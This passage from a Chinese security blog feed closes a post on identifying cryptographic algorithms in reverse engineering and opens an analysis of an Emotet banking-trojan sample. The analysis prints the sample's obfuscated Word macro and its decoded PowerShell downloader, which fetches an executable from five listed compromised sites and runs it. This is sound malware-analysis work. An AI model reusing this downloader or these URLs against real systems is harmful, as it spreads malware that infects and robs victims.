class="number">0x80C07AFC9D25404D6555B9ACF3567CF1</span>)</span><br><span class="line">    print(hex(result)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure></li></ol><ol start="11"><li>powmod函数的部分伪代码作为参考<img src="https://i.loli.net/2019/11/17/kn7zr5GxJIQORLD.png" alt="image.png"></li></ol><h3 id="Mircal大数运算库"><a href="#Mircal大数运算库" class="headerlink" title="Mircal大数运算库"></a>Mircal大数运算库</h3><p>Mircal库过于常用,需要进一步的熟悉才能更加利于分析.</p><p>头文件有<code>mircal.h</code>和<code>mirdef.h</code>两者,库文件为<code>ms32.lib</code></p><p>以下是大数运算库函数的<code>Magic number</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">MIRACL MAGIC NUMBERS TABLE:</span><br><span class="line">                       by bLaCk-eye </span><br><span class="line">from an original ideea by bF!^k23</span><br><span class="line">        Modified by cnbragon for miracl v5.01</span><br><span class="line">        </span><br><span class="line">NUMBER OF FUNCTIONS:96h</span><br><span class="line"></span><br><span class="line">innumequ 01h .</span><br><span class="line">otnumequ 02h .</span><br><span class="line">jackequ 03h .</span><br><span class="line">normaliseequ 04h .</span><br><span class="line">multiplyequ 05h .</span><br><span class="line">divideequ 06h .</span><br><span class="line">increqu 07h .</span><br><span class="line">decrequ 08h .</span><br><span class="line">premultequ 09h .</span><br><span class="line">subdivequ 0Ah .</span><br><span class="line">fdsizeequ 0Bh .</span><br><span class="line">egcdequ 0Ch .</span><br><span class="line">cbaseequ 0Dh .</span><br><span class="line">cinnumequ 0Eh .</span><br><span class="line">cotnumequ 0Fh .</span><br><span class="line">nrootequ 10h .</span><br><span class="line">powerequ 11h .</span><br><span class="line">powmodequ 12h .</span><br><span class="line">bigdigequ 13h .</span><br><span class="line">bigrandequ 14h .</span><br><span class="line">nxprimeequ 15h .</span><br><span class="line">isprimeequ 16h .</span><br><span class="line">mirvarequ 17h .</span><br><span class="line">mad    equ 18h.</span><br><span class="line">multi_inverseequ 19h .</span><br><span class="line">putdigequ 1Ah .</span><br><span class="line">add    equ 1Bh .</span><br><span class="line">subtractequ 1Ch .</span><br><span class="line">mirsysequ 1Dh .</span><br><span class="line">xgcdequ 1Eh .</span><br><span class="line">fpackequ 1Fh .</span><br><span class="line">dconvequ 20h .</span><br><span class="line">mr_shiftequ 21h .</span><br><span class="line">mroundequ 22h .</span><br><span class="line">fmulequ 23h .</span><br><span class="line">fdivequ 24h .</span><br><span class="line">faddequ 25h .</span><br><span class="line">fsubequ 26h .</span><br><span class="line">fcompequ 27h .</span><br><span class="line">fconvequ 28h .</span><br><span class="line">frecipequ 29h .</span><br><span class="line">fpmulequ 2Ah .</span><br><span class="line">fincrequ 2Bh .</span><br><span class="line">;null entry</span><br><span class="line">ftruncequ 2Dh .</span><br><span class="line">frandequ 2Eh .</span><br><span class="line">sftbitequ 2Fh .</span><br><span class="line">buildequ 30h .</span><br><span class="line">logb2equ 31h .</span><br><span class="line">expintequ 32h .</span><br><span class="line">fpowerequ 33h .</span><br><span class="line">frootequ 34h .</span><br><span class="line">fpi    equ 35h .</span><br><span class="line">fexpequ 36h .</span><br><span class="line">flogequ 37h .</span><br><span class="line">fpowfequ 38h .</span><br><span class="line">ftanequ 39h .</span><br><span class="line">fatanequ 3Ah .</span><br><span class="line">fsinequ 3Bh .</span><br><span class="line">fasinequ 3Ch .</span><br><span class="line">fcosequ 3Dh .</span><br><span class="line">facosequ 3Eh .</span><br><span class="line">ftanhequ 3Fh .</span><br><span class="line">fatanhequ 40h .</span><br><span class="line">fsinhequ 41h .</span><br><span class="line">fasinhequ 42h .</span><br><span class="line">fcoshequ 43h .</span><br><span class="line">facoshequ 44h .</span><br><span class="line">flopequ 45h .</span><br><span class="line">gprimeequ 46h .</span><br><span class="line">powltrequ 47h .</span><br><span class="line">fft_multequ 48h .</span><br><span class="line">crt_initequ 49h .</span><br><span class="line">crt    equ 4Ah .</span><br><span class="line">otstrequ 4Bh .</span><br><span class="line">instrequ 4Ch .</span><br><span class="line">cotstrequ 4Dh .</span><br><span class="line">cinstrequ 4Eh .</span><br><span class="line">powmod2equ 4Fh .</span><br><span class="line">prepare_montyequ 50h .</span><br><span class="line">nresequ 51h .</span><br><span class="line">redcequ 52h .</span><br><span class="line">nres_modmultequ 53h .</span><br><span class="line">nres_powmodequ 54h .</span><br><span class="line">nres_moddivequ 55h .</span><br><span class="line">nres_powltrequ 56h .</span><br><span class="line">divisibleequ 57h .</span><br><span class="line">remainequ 58h .</span><br><span class="line">fmoduloequ 59h .</span><br><span class="line">nres_modaddequ 5Ah .</span><br><span class="line">nres_modsubequ 5Bh .</span><br><span class="line">nres_negateequ 5Ch .</span><br><span class="line">ecurve_initequ 5Dh .</span><br><span class="line">ecurve_addequ 5Eh .</span><br><span class="line">ecurve_multequ 5Fh .</span><br><span class="line">epoint_initequ 60h .</span><br><span class="line">epoint_setequ 61h .</span><br><span class="line">epoint_getequ 62h .</span><br><span class="line">nres_powmod2equ 63h .</span><br><span class="line">nres_sqrootequ 64h .</span><br><span class="line">sqrootequ 65h </span><br><span class="line">nres_premultequ 66h .</span><br><span class="line">ecurve_mult2equ 67h .</span><br><span class="line">ecurve_subequ 68h .</span><br><span class="line">trial_divisionequ 69h .</span><br><span class="line">nxsafeprimeequ 6Ah .</span><br><span class="line">nres_lucasequ 6Bh .</span><br><span class="line">lucasequ 6Ch .</span><br><span class="line">brick_initequ 6Dh .</span><br><span class="line">pow_brickequ 6Eh .</span><br><span class="line">set_user_functionequ 6Fh .</span><br><span class="line">nres_powmodnequ 70h .</span><br><span class="line">powmodnequ 71h .</span><br><span class="line">ecurve_multnequ 72h .</span><br><span class="line">ebrick_initequ 73h .</span><br><span class="line">mul_brickequ 74h .</span><br><span class="line">epoint_normequ 75h .</span><br><span class="line">nres_multi_inverseequ 76h .</span><br><span class="line">;null entry</span><br><span class="line">nres_dotprodequ 78h .</span><br><span class="line">epoint_negateequ 79h .</span><br><span class="line">ecurve_multi_addequ 7Ah .</span><br><span class="line">ecurve2_initequ 7Bh .</span><br><span class="line">epoint2_initequ 7Ch</span><br><span class="line">epoint2_setequ 7Dh .</span><br><span class="line">epoint2_normequ 7Eh .</span><br><span class="line">epoint2_getequ 7Fh .</span><br><span class="line">epoint2_compequ 80h .</span><br><span class="line">ecurve2_addequ 81h .</span><br><span class="line">epoint2_negateequ 82h .</span><br><span class="line">ecurve2_subequ 83h .</span><br><span class="line">ecurve2_multi_addequ 84h .</span><br><span class="line">ecurve2_multequ 85h .</span><br><span class="line">ecurve2_multnequ 86h .</span><br><span class="line">ecurve2_mult2equ 87h .</span><br><span class="line">ebrick2_initequ 88h .</span><br><span class="line">mul2_brickequ 89h .</span><br><span class="line">prepare_basisequ 8Ah .</span><br><span class="line">strong_bigrandequ 8Bh .</span><br><span class="line">bytes_to_bigequ 8Ch .</span><br><span class="line">big_to_bytesequ 8Dh .</span><br><span class="line">set_io_buffer_sizeequ 8Eh .</span><br><span class="line">epoint_getxyz       equ 8Fh .</span><br><span class="line">ecurve_double_add   equ 90h .</span><br><span class="line">nres_double_inverse equ 91h .</span><br><span class="line">double_inverse      equ 92h .</span><br><span class="line">epoint_x            equ 93h .</span><br><span class="line">hamming             equ 94h .</span><br><span class="line">expb2               equ 95h .</span><br><span class="line">bigbits             equ 96h .</span><br></pre></td></tr></table></figure><h4 id="反汇编识别"><a href="#反汇编识别" class="headerlink" title="反汇编识别"></a>反汇编识别</h4><p>反汇编识别着重在于查看函数内部的<code>mov     doword ptr [eax+ecx*4+20], yy</code>格式的反汇编代码,yy即为<code>magic number</code></p><p><img src="https://i.loli.net/2019/11/17/dHEM5beyFUzDIZv.png" alt="image.png"></p><p>这是函数对比图</p><h5 id="sub-401730"><a href="#sub-401730" class="headerlink" title="sub_401730"></a>sub_401730</h5><p><img src="https://i.loli.net/2019/11/17/8tm1rRfjHlNGXbE.png" alt="image.png"></p><h5 id="sub-403BD0"><a href="#sub-403BD0" class="headerlink" title="sub_403BD0"></a>sub_403BD0</h5><p><img src="https://i.loli.net/2019/11/17/zS7xgf5evAr4dRG.png" alt="image.png"></p><p>其他的就不一一找了,都在函数内部都能看见.基本上是这样去识别.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><strong>&lt;&lt;加密与解密4</strong>&gt;&gt;</p><p><a href="https://www.cnblogs.com/gambler/p/9075415.html" target="_blank" rel="noopener">https://www.cnblogs.com/gambler/p/9075415.html</a></p><p><a href="http://dyf.ink/reverse/Identify-Encode-Encryption/introduction/" target="_blank" rel="noopener">http://dyf.ink/reverse/Identify-Encode-Encryption/introduction/</a></p><p><a href="https://xz.aliyun.com/t/5644" target="_blank" rel="noopener">https://xz.aliyun.com/t/5644</a></p><p><a href="https://www.zhihu.com/question/36306744" target="_blank" rel="noopener">https://www.zhihu.com/question/36306744</a></p><p><a href="https://bbs.pediy.com/thread-251248.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251248.htm</a></p><p><a href="http://dyf.ink/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">http://dyf.ink/crypto/asymmetric/rsa/rsa_theory/</a></p><p><a href="https://www.kancloud.cn/kancloud/rsa_algorithm/48484" target="_blank" rel="noopener">https://www.kancloud.cn/kancloud/rsa_algorithm/48484</a></p><p><a href="https://juejin.im/entry/5b1bab6b6fb9a01e605fcddd" target="_blank" rel="noopener">https://juejin.im/entry/5b1bab6b6fb9a01e605fcddd</a></p><p><a href="https://cloud.tencent.com/developer/article/1040293" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1040293</a></p><p><a href="https://www.cnblogs.com/starwolf/p/3365834.html" target="_blank" rel="noopener">https://www.cnblogs.com/starwolf/p/3365834.html</a></p><p><a href="https://github.com/matt-wu/AES/blob/master/README.md" target="_blank" rel="noopener">https://github.com/matt-wu/AES/blob/master/README.md</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;想作为分析勒索病毒前的密码学接触.&lt;/p&gt;
&lt;p&gt;常用加解密算法的逆向分析中的识别,不做过多算法原理上的叙述,别人讲的好多了.站在巨人的肩膀上.&lt;/p&gt;
&lt;p&gt;这篇文章只作为特征查找用来辅助平时分析用.&lt;/p&gt;
&lt;p&gt;两种工具&lt;code&gt;ida&lt;/code&gt;插件&lt;code&gt;FindCrypt2&lt;/code&gt;和&lt;code&gt;peid&lt;/code&gt;的&lt;code&gt;KANA&lt;/code&gt;进行算法识别是很好用的.&lt;/p&gt;
&lt;h3 id=&quot;updated&quot;&gt;&lt;a href=&quot;#updated&quot; class=&quot;headerlink&quot; title=&quot;updated:&quot;&gt;&lt;/a&gt;updated:&lt;/h3&gt;&lt;p&gt;2020-03-10 Salsa20.&lt;/p&gt;
&lt;h3 id=&quot;Base64&quot;&gt;&lt;a href=&quot;#Base64&quot; class=&quot;headerlink&quot; title=&quot;Base64&quot;&gt;&lt;/a&gt;Base64&lt;/h3&gt;&lt;h4 id=&quot;历史发展&quot;&gt;&lt;a href=&quot;#历史发展&quot; class=&quot;headerlink&quot; title=&quot;历史发展&quot;&gt;&lt;/a&gt;历史发展&lt;/h4&gt;&lt;p&gt;&lt;code&gt;base64&lt;/code&gt;最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 &lt;code&gt;ascii&lt;/code&gt; 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。因此 &lt;code&gt;base64&lt;/code&gt;就可以用来将二进制文件内容编码为只包含 ascii 字符的内容，这样就可以传输了.&lt;/p&gt;
&lt;p&gt;简单来说为了兼容各种数据格式.&lt;/p&gt;
    
    </summary>
    
      <category term="逆向基础" scheme="http://blog.dgmddw.xyz/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="密码学" scheme="http://blog.dgmddw.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Emotet后台pe木马较不完整分析</title>
    <link href="http://blog.dgmddw.xyz/2019/10/24/2019-10-24-Emotet%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2019/10/24/2019-10-24-Emotet木马分析/</id>
    <published>2019-10-23T16:00:00.000Z</published>
    <updated>2020-03-07T13:12:08.317Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>2019-11-07</p><p><code>ioc</code>规则提交给微步时,顺便把恶意<code>ip</code>搜索了一下,发现<code>Emotet</code>银行木马家族.</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下最近分析的一个样本,自己依然是个菜鸡,有很多不足,希望各位师傅提出错误我努力学习.我头发都没了.此木马发送用户信息加密,能进行远程后门访问等功能,导入函数和导出函数只有一个,大量的动态加载api. </p><p>idb和样本都放下面学习链接那了.</p><a id="more"></a><h2 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h2><ul><li>样本名称: f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282-1571228285.doc</li><li>样本大小:  182,784</li><li>MD5:  b72f31807db78e70eb2c45993dd2a4e1</li><li>SHA-256: c1fff4d580677f66da1841e882d94f17bc04068d</li><li>SHA-1: f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282</li><li>样本来源:  <a href="https://app.any.run/tasks/62240da8-9741-45ff-8c12-b26d704a6145/" target="_blank" rel="noopener">https://app.any.run/tasks/62240da8-9741-45ff-8c12-b26d704a6145/</a></li></ul><h2 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h2><ul><li>环境: VMware15 , Win10 专业版, Office 365</li></ul><h2 id="0x03-病毒行为"><a href="#0x03-病毒行为" class="headerlink" title="0x03 病毒行为"></a>0x03 病毒行为</h2><p><img src="https://i.loli.net/2019/10/21/Njwsd3ZYCkHugeq.png" alt="image.png"></p><h2 id="0x04-详细分析"><a href="#0x04-详细分析" class="headerlink" title="0x04 详细分析"></a>0x04 详细分析</h2><h3 id="一-打开doc-宏代码"><a href="#一-打开doc-宏代码" class="headerlink" title="一. 打开doc,宏代码"></a>一. 打开doc,宏代码</h3><p><code>Alt+F11</code>查看调试宏代码</p><p>三个模块分别为<code>Pibafqel</code>,<code>Nzolhtmfybml</code>,<code>Xhnbvwxbzhq</code>.<code>Nzolhtmfybml</code>里面是空的,其他两个里面充满类似家庭地址的注释,使用脚本删除掉后进行调试翻译.去除无用混淆,大多数都只是定义,声明的函数.</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> XXX()</span><br><span class="line">            ;这种格式表示一个函数</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen() </span><br><span class="line">            ;运行文档时候，自动运行宏</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>调试后发现,在<code>autoopen</code>中使用过函数有<code>Hsbahypqju()</code>和<code>Abiufkgnjgdiv(Kmtifafrucqb)</code>.</p><p>化简:<img src="https://i.loli.net/2019/10/18/pR8JMlgx3KU1Ci9.png" alt="image.png"></p><h4 id="autopen"><a href="#autopen" class="headerlink" title="autopen()"></a>autopen()</h4><p>调用<code>Hsbahypqju()</code>,</p><h4 id="Hsbahypqju"><a href="#Hsbahypqju" class="headerlink" title="Hsbahypqju()"></a>Hsbahypqju()</h4><p>遇到个office坑比的地方,通过监视窗口只能查看前250个字符,所以最好通过<code>Debug.Print</code>打印变量,能看到全部字符串</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> Hsbahypqju()</span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> Dtzjcfqgj = <span class="built_in">CreateObject</span>(<span class="string">"winmgmts:win32_processstartup"</span>)</span><br><span class="line">Dtzjcfqgj.ShowWindow = <span class="number">0</span>#</span><br><span class="line">    Thbjfvedxuqm = <span class="string">"powershell -e &lt;# https://www.microsoft.com/ #&gt; $Eywrqrdqbmw='Rzhvtqwrc';$Jcwhciloutn = '846';$Ctyrqdpzavru='Wixhqavur';$Bpaqqzwo=$env:userprofile+'\'+$Jcwhciloutn+'.exe';$Yawfxccmy='Ezlignhvinnmt';$Tlvpwcruuo=.('new-'+'obj'+'ect') NEt.WebClIENT;$Jznyrpyuqf='http://complaintboardonline.com/wp-admin/qekr3925/*https://frazischool.com/wp-includes/ozi2y6740/*https://sagarngofoundation.com/jxc5c/q54824/*https://naturerepublickh.com/test/wvvqa9/*https://watonlight.com/wp-admin/wa31628/'."</span>sp`LiT<span class="string">"('*');$Ufiwicmkrdst='Ohjtzdywhuim';foreach($Lygaeckfk in $Jznyrpyuqf)&#123;try&#123;$Tlvpwcruuo."</span>d`OwNLoa`D`FILE<span class="string">"($Lygaeckfk, $Bpaqqzwo);$Tlncrdhw='Fvsotfnt';If ((&amp;('G'+'et-It'+'em') $Bpaqqzwo)."</span>LE`NgtH<span class="string">" -ge 23622) &#123;[Diagnostics.Process]::"</span>s`TARt<span class="string">"($Bpaqqzwo);$Getujvyyonwg='Gppbzmrdhoel';break;$Cgphukmh='Hhiypojok'&#125;&#125;catch&#123;&#125;&#125;$Pyreoccwfqy='Whyolyeyvhts'"</span></span><br><span class="line"><span class="keyword">Set</span> Ywlbxgbmzrxh = <span class="built_in">CreateObject</span>(<span class="string">"winmgmts:Win32_Process"</span>)</span><br><span class="line">Finrmepurj = Ywlbxgbmzrxh.Create(Thbjfvedxuqm, Ncrmxklxbct, Dtzjcfqgj, Pxajxegluaugg) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><ol><li><p>创建一个<code>winmgmts:win32_processstartup</code>对象,仅用于将信息传递给<a href="https://docs.microsoft.com/zh-cn/windows/win32/cimwin32prov/win32-process" target="_blank" rel="noopener"><strong>Win32_Process</strong></a>类的<a href="https://docs.microsoft.com/zh-cn/windows/win32/cimwin32prov/create-method-in-class-win32-process" target="_blank" rel="noopener"><strong>Create</strong></a>方法。</p></li><li><p>隐藏窗口</p></li><li><p>命令行字符串</p></li><li><p>创建<code>winmgmts:Win32_Process</code>对象</p></li><li><p>通过<code>Win32_Process</code>方法<code>Creat</code>运行字符串.<code>-e</code>为<code>-EncodeCommand</code>.<code>powershell -e</code>运行base64编码的字符串.</p><p>Create(命令行,子进程路径,启动配置,进程od)`</p></li></ol><h4 id="Abiufkgnjgdiv-Kmtifafrucqb"><a href="#Abiufkgnjgdiv-Kmtifafrucqb" class="headerlink" title="Abiufkgnjgdiv(Kmtifafrucqb)"></a>Abiufkgnjgdiv(Kmtifafrucqb)</h4><p>将传入的字符串中的<code>0xdc3</code>替换为空,恢复字符串的作用.</p><h3 id="二-PowerShell脚本分析"><a href="#二-PowerShell脚本分析" class="headerlink" title="二. PowerShell脚本分析"></a>二. PowerShell脚本分析</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Eywrqrdqbmw</span>=<span class="string">'Rzhvtqwrc'</span>;</span><br><span class="line"><span class="variable">$Jcwhciloutn</span> = <span class="string">'846'</span>;</span><br><span class="line"><span class="variable">$Ctyrqdpzavru</span>=<span class="string">'Wixhqavur'</span>;</span><br><span class="line"><span class="variable">$Bpaqqzwo</span>=<span class="string">"%userprofile%\846.exe"</span>;</span><br><span class="line"><span class="variable">$Yawfxccmy</span>=<span class="string">'Ezlignhvinnmt'</span>;</span><br><span class="line"><span class="variable">$Tlvpwcruuo</span>=.(<span class="string">'new-object'</span>) NEt.WebClIENT;</span><br><span class="line"><span class="variable">$Jznyrpyuqf</span>=<span class="string">'http://complaintboardonline.com/wp-admin/qekr3925/*https://frazischool.com/wp-includes/ozi2y6740/*https://sagarngofoundation.com/jxc5c/q54824/*https://naturerepublickh.com/test/wvvqa9/*https://watonlight.com/wp-admin/wa31628/'</span>.<span class="string">"spLiT"</span>(<span class="string">'*'</span>);</span><br><span class="line"><span class="variable">$Ufiwicmkrdst</span>=<span class="string">'Ohjtzdywhuim'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$Lygaeckfk</span> <span class="keyword">in</span> <span class="variable">$Jznyrpyuqf</span>)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$Tlvpwcruuo</span>.<span class="string">"dOwNLoaDFILE"</span>(<span class="variable">$Lygaeckfk</span>, <span class="variable">$Bpaqqzwo</span>);</span><br><span class="line"><span class="variable">$Tlncrdhw</span>=<span class="string">'Fvsotfnt'</span>;</span><br><span class="line"><span class="keyword">If</span> ((&amp;(<span class="string">'Get-Item'</span>) <span class="variable">$Bpaqqzwo</span>).<span class="string">"LENgtH"</span> <span class="nomarkup">-ge</span> <span class="number">23622</span>) &#123;</span><br><span class="line">[Diagnostics.Process]::<span class="string">"sTARt"</span>(<span class="variable">$Bpaqqzwo</span>);</span><br><span class="line"><span class="variable">$Getujvyyonwg</span>=<span class="string">'Gppbzmrdhoel'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="variable">$Cgphukmh</span>=<span class="string">'Hhiypojok'</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Pyreoccwfqy</span>=<span class="string">'Whyolyeyvhts'</span></span><br></pre></td></tr></table></figure><ol><li>创建<code>WebClient</code>对象</li><li>调用<code>downloadfile</code>方法通过用<code>*</code>分割好的数组的链接遍历下载文件并存储为<code>%userprofile%\846.exe</code></li><li>如果长度大于23622,则启动<code>846.exe</code>程序.</li><li>最后一个网址疑似被挂马,可能已被入侵作为传播中转站.</li></ol><h3 id="三-846-exe"><a href="#三-846-exe" class="headerlink" title="三. 846.exe"></a>三. 846.exe</h3><p>位置: %userprofile%\846.exe</p><p>名称: 846.exe</p><p>md5: e83c5ba6be05ec51ae6ceb2470fcfdf3</p><p>sha-1: 94b527756b6c6753822501f76f161bf64ad6974c</p><p>sha-256: fb0a0f10cbebefb5dbe6034c3bdfe246179e444c68a6e36c4d20232d52fc07a7</p><p><img src="https://i.loli.net/2019/10/22/BTgSAonUl9yt8hj.png" alt="image.png"></p><p>时间是最近创建的.无壳,使用vs2015编译.</p><h4 id="0x01行为分析"><a href="#0x01行为分析" class="headerlink" title="0x01行为分析"></a>0x01行为分析</h4><p>根据<code>ProcessExplorer</code>观察程序执行大概流程.<code>846.exe</code>执行后会启动一个新进程 后杀掉自己.新进程名为<code>dasmrcdasmrc.exe</code>,地址为<code>%LOCALAPPDATA%\dasmrcdasmrc.exe</code></p><p><img src="https://i.loli.net/2019/10/19/HTRUwcAivas2org.png" alt="image.png"></p><h4 id="0x02-详细分析"><a href="#0x02-详细分析" class="headerlink" title="0x02 详细分析"></a>0x02 详细分析</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>存在唯一的导出函数<code>qzLgKZBqfCXorfLMeJzdKzgyvdzqwF</code>,<code>EntryPoint</code>为<code>0x00004960</code></p><p><code>CIRC OLE Control DLL</code>可能某个样本种类吧.</p><h5 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h5><h6 id="0x01-Winmain"><a href="#0x01-Winmain" class="headerlink" title="0x01 Winmain"></a>0x01 Winmain</h6><p><img src="https://i.loli.net/2019/10/20/NcUVFW846Dnsdpu.png" alt="image.png"></p><p>通过导出表获取函数<code>qzLgKZBqfCXorfLMeJzdKzgyvdzqwF</code>的地址,跳转执行.</p><h6 id="0x02-导出函数-qzLgKZBqfCXorfLMeJzdKzgyvdzqwF"><a href="#0x02-导出函数-qzLgKZBqfCXorfLMeJzdKzgyvdzqwF" class="headerlink" title="0x02 导出函数 qzLgKZBqfCXorfLMeJzdKzgyvdzqwF()"></a>0x02 导出函数 qzLgKZBqfCXorfLMeJzdKzgyvdzqwF()</h6><p><img src="https://i.loli.net/2019/10/19/SpXs2N7LhHjlxae.png" alt="image.png"></p><p>获取<code>VirtualAlloc</code>函数地址,以使得后续能拷贝执行数据.</p><p><img src="https://i.loli.net/2019/10/20/1zagy6WxLV5qbUe.png" alt="image.png"></p><h6 id="0x03-解密数据执行"><a href="#0x03-解密数据执行" class="headerlink" title="0x03 解密数据执行"></a>0x03 解密数据执行</h6><p><img src="https://i.loli.net/2019/10/20/G68gUqlMVekoZPD.png" alt="image.png"></p><ol><li><p><code>sub_1E0467</code>函数通过传如对应函数<code>hash</code>值获取所需api地址.</p><p>sub_1e0467:<img src="https://i.loli.net/2019/10/20/umYZlpwNtLsWyh8.png" alt="image.png"></p><p><code>(((FS:[30])+0xC)+0xC)</code>获取<code>Ldr</code>的地址,后面进行遍历和比较最终得到所需要的地址. 参考链接放在下面了.</p><p><img src="https://i.loli.net/2019/10/20/MWcG5X49TLRKm2k.png" 